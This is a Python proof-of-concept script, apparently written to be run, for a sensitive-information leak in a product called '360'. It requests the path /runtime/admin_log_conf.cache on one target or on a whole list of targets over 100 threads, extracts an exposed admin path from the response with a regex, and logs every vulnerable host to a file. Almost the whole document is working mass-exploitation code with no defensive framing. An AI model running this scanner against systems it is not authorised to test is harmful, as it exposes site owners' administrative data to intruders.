import argparse,requests,sys,time,re,json
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()
GREEN = '\033[92m' #输出颜色
RESET = '\033[0m'
def banner():
    text="""       ____.__            ____.__        
    |    |__| ____     |    |__| ____  
    |    |  |/ __ \    |    |  |/ __ \ 
/\__|    |  \  ___//\__|    |  \  ___/ 
\________|__|\___  >________|__|\___  >
                 \/                 \/ 

     
writer:杰杰宝贝
"""
    print(text)
def main():
    banner()
    parser = argparse.ArgumentParser(description='360敏感信息泄露漏洞')
    parser.add_argument('-u','--url',dest='url',type=str,help="your one url")
    parser.add_argument('-f','--file',dest='file',type=str,help='input your file name ')
    args = parser.parse_args()
    if args.url and not args.file:
        poc(args.url)

    elif args.file and not args.url:
        urllist = []
        with open(args.file,'r',encoding='utf-8') as fp:
            for url in fp.readlines():
                urllist.append(url.strip())
        mp = Pool(100)
        mp.map(poc,urllist)
        mp.close()
        mp.join()
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h")
def poc(target):
    try:
        payload='/runtime/admin_log_conf.cache'
        headers = {
            'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:128.0) Gecko/20100101 Firefox/128.0',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8',
            'Content-Length':'2'
        }
        res = requests.get(url=target+payload,headers=headers,verify=False,timeout=5)
        match = re.search(r's:11:"TYPE_IMPORT";}s:17:"(.*?)";a:2:{s:4:"name";s:12:"本地帐号"',res.text)
        print(match.group(1))
        if '/admin/index/list' in  match.group(1):
            with open ('jjbb.txt','a',encoding='utf-8') as fp:
                fp.write(target+"------存在漏洞"+'\n')
            print(f"{GREEN}[+]存在漏洞-----{target}{RESET}")
            
        else:
            print(f"[-]漏洞不存在-----{target}")
    except:
        print(f"{target}您的网站有问题，请手动测试")

if __name__ == '__main__' :
    main()